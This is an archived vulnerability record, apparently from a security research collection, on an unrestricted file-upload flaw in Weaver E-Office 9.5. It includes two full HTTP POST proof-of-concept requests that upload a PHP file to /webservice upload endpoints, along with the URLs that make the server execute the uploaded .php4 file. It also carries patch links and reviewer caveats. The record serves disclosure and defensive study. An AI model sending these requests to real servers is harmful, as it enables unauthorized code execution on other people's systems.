---
source: "MrWQ/vulnerability-paper"
title: "泛微e-office webservice上传接口不受限上传"
product: "泛微e-office"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: "CVE-2023-2648;WooYun-2015-0125592"
identifier_status: "unknown"
affected_scope: "9.5；php4可执行映射；两接口"
prerequisites: "第一样本有普通cookie，第二无凭证；未证明无需身份"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/F3pvaEGoMUYteEgkO2UlJw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Office%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-4503133174adf614d0acf580"
entity_id: "ve-4503133174adf614d0acf580"
schema_version: "1"
---

# 泛微e-office webservice上传接口不受限上传

## 条目说明

- 对象与具体问题：泛微e-office；webservice上传接口不受限上传
- 版本、配置及部署条件：9.5；php4可执行映射；两接口
- 认证与权限前提：第一样本有普通cookie，第二无凭证；未证明无需身份
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两个接口应独立endpoint记录；CVE-2023-2648仅引用另一篇getshell教程，不是本文主ID
- multipart字段名/filename缺失，文字Filedata不能自动还原全部字段
- Wooyun-2015-0125592是参考来源，需确认其版本/根因映射；保留php4部署条件
- 标题过泛，应加/webservice/upload.php等路径

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F3pvaEGoMUYteEgkO2UlJw)

  

网安引领时代，弥天点亮未来   

  

  

![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)

  

**0x01 漏洞介绍**  

Weaver E-Office 是中国泛微科技（Weaver）公司的一个协同办公系统。

Weaver E-Office 9.5 版本存在代码问题漏洞，该漏洞源于文件 /webservice/upload/upload.php 和 /webservice/upload.php 存在问题，对参数 Filedata 的操作会导致不受限制的上传。

![](../../.resource/remote/5421cefcba81a983f622ecbade2410129a1b6b0451dcd2309e56eb5d7fdd213a.png)

![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)

  

**0x02 影响版本**  

  

Weaver E-Office 9.5 版本

![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)

  

**0x03 漏洞复现**  

  

1. 部署漏洞环境访问

![](../../.resource/remote/ae356e487e04bdf7346f6df135f687420115c8aadde73bd0791f5a0aeabece0c.png)

2. 对漏洞进行复现

 **Poc （POST）**

 **路径 1 /webservice/upload/upload.php**

```http
POST /webservice/upload/upload.php HTTP/1.1
Host: 10.211.55.3:8082
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cn
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------10267625012906
Content-Length: 208
-----------------------------10267625012906
Content-Disposition: form-data; 
Content-Type: application/php
<?php echo md5(43856);unlink(__FILE__);?>
-----------------------------10267625012906--

```

漏洞复现

POST 请求，响应存在漏洞

![](../../.resource/remote/3a3686dabd5368f95260c2b84e806e15c7af6108218f3cf1e8143022d3774465.png)

        解析 php 文件 

```
http://10.211.55.3:8082/attachment/870392248/pufh.php4

```

![](../../.resource/remote/ee337b3f774f7e327d06e8ee9422d3d7f2ca9b7da1a48a78d0b4c1ca4220d190.png)

**路径 2 /webservice/upload.php**

```http
POST /webservice/upload.php HTTP/1.1
Host: 10.211.55.3:8082
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Length: 220
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
Accept-Encoding: gzip
Connection: close
------WebKitFormBoundaryakbyiukl
Content-Disposition: form-data; 
Content-Type: application/octet-stream
<?php echo md5(43856);unlink(__FILE__);?>
------WebKitFormBoundaryakbyiukl--

```

![](../../.resource/remote/cb8c6ac3ac4c78662146600bbee0be94d8c6f4269a294342a55825552b599b5e.png)

解析解 php 文件 

```
http://10.211.55.3:8082/attachment/2085157518/pufh.php4

```

![](../../.resource/remote/e42f98e17afc0dd16faa3e6e0aa225be24b45859775d362388b0b2410797c3cd.png)

流量情况

![](../../.resource/remote/1669fa7275615d0ed172bb732a5564cab6c5995fa2ddb2986669073313e67552.png)

3.afrog_2.6.0 工具测试（漏洞存在）上传测试文件。

![](../../.resource/remote/b976a469ffb0783707867b90c5a891ce73c5589d05d55a25193e628c7b0369cc.png)

4.Getshell 同泛微 E-Office 文件上传漏洞 (CVE-2023-2648) 操作，这里省略.......

[泛微 E-Office 文件上传漏洞 (CVE-2023-2648)](http://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247498502&idx=1&sn=bb5ee3b680335c9deca30ab86ae5e4db&chksm=fc466e64cb31e772c654d6234e5b08316984047bbd4a4903e15a669703b14c3bc0ae8680bee1&scene=21#wechat_redirect)

![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://service.e-office.cn/download
https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125592

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](../../.resource/remote/c6a1f1785136ac8e3569e121fb1e5363476b21cca8e6c6d753990c3e7a635b3c.gif) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](../../.resource/remote/3c760224fd27cc6dbcd693aed8b85f6c1ac55b4d648247f6ba7ffb9ff0637f01.jpg)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
